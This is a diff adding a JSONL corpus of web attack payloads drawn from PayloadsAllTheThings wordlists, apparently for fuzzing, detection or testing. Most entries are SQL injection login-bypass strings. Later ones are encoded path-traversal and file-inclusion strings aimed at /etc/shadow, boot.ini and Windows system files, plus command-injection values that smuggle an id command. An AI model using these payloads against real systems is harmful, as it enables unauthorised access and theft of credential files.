@@ -1,0 +1,96 @@
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:1", "payload": "'-'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:2", "payload": "' '"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:3", "payload": "'&'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:4", "payload": "'^'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:5", "payload": "'*'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:6", "payload": "' or ''-'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:7", "payload": "' or '' '"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:8", "payload": "' or ''&'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:9", "payload": "' or ''^'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:10", "payload": "' or ''*'"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:11", "payload": "\"-\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:12", "payload": "\" \""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:13", "payload": "\"&\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:14", "payload": "\"^\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:15", "payload": "\"*\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:16", "payload": "\" or \"\"-\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:17", "payload": "\" or \"\" \""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:18", "payload": "\" or \"\"&\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:19", "payload": "\" or \"\"^\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:20", "payload": "\" or \"\"*\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:21", "payload": "or true--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:22", "payload": "\" or true--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:23", "payload": "' or true--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:24", "payload": "\") or true--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:25", "payload": "') or true--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:26", "payload": "' or 'x'='x"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:27", "payload": "') or ('x')=('x"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:28", "payload": "')) or (('x'))=(('x"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:29", "payload": "\" or \"x\"=\"x"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:30", "payload": "\") or (\"x\")=(\"x"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:31", "payload": "\")) or ((\"x\"))=((\"x"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:32", "payload": "or 1=1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:34", "payload": "or 1=1#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:35", "payload": "or 1=1/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:36", "payload": "admin' --"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:37", "payload": "admin' #"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:38", "payload": "admin'/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:39", "payload": "admin' or '1'='1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:40", "payload": "admin' or '1'='1'--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:41", "payload": "admin' or '1'='1'#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:42", "payload": "admin' or '1'='1'/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:43", "payload": "admin'or 1=1 or ''='"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:44", "payload": "admin' or 1=1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:45", "payload": "admin' or 1=1--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:46", "payload": "admin' or 1=1#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:47", "payload": "admin' or 1=1/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:48", "payload": "admin') or ('1'='1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:49", "payload": "admin') or ('1'='1'--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:50", "payload": "admin') or ('1'='1'#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:51", "payload": "admin') or ('1'='1'/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:52", "payload": "admin') or '1'='1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:53", "payload": "admin') or '1'='1'--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:54", "payload": "admin') or '1'='1'#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:55", "payload": "admin') or '1'='1'/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:56", "payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:57", "payload": "admin\" --"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:58", "payload": "admin\" #"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:59", "payload": "admin\"/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:60", "payload": "admin\" or \"1\"=\"1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:61", "payload": "admin\" or \"1\"=\"1\"--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:62", "payload": "admin\" or \"1\"=\"1\"#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:63", "payload": "admin\" or \"1\"=\"1\"/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:64", "payload": "admin\"or 1=1 or \"\"=\""}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:65", "payload": "admin\" or 1=1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:66", "payload": "admin\" or 1=1--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:67", "payload": "admin\" or 1=1#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:68", "payload": "admin\" or 1=1/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:69", "payload": "admin\") or (\"1\"=\"1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:70", "payload": "admin\") or (\"1\"=\"1\"--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:71", "payload": "admin\") or (\"1\"=\"1\"#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:72", "payload": "admin\") or (\"1\"=\"1\"/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:73", "payload": "admin\") or \"1\"=\"1"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:74", "payload": "admin\") or \"1\"=\"1\"--"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:75", "payload": "admin\") or \"1\"=\"1\"#"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:76", "payload": "admin\") or \"1\"=\"1\"/*"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass.txt:78", "payload": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"}
+{"family": "sqli", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:SQL Injection/Intruder/Auth_Bypass2.txt:3", "payload": "'"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:13", "payload": "%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:16", "payload": "%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:26", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:29", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:59", "payload": "%2e%68%74%61%63%63%65%73%73"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:103", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:112", "payload": "C:/inetpub/wwwroot/global.asa"}
+{"family": "path-traversal", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Directory Traversal/Intruder/directory_traversal.txt:132", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:25", "payload": ";|/usr/bin/id|"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:30", "payload": "\\nid\\n"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:34", "payload": "\\nid|"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:36", "payload": ";id\\n"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:46", "payload": "a;id|"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:70", "payload": "%0A/usr/bin/id%0A"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:79", "payload": "& id"}
+{"family": "command-injection", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:Command Injection/Intruder/command-execution-unix.txt:81", "payload": "%0a id %0a"}
+{"family": "lfi", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:File Inclusion/Intruders/JHADDIX_LFI.txt:15", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini"}
+{"family": "lfi", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:File Inclusion/Intruders/JHADDIX_LFI.txt:17", "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"}
+{"family": "lfi", "source": "PayloadsAllTheThings@08ea40e77db3f42ef8f20c65196f3936a19b6c86:File Inclusion/Intruders/JHADDIX_LFI.txt:81", "payload": "C:/inetpub/wwwroot/global.asa"}
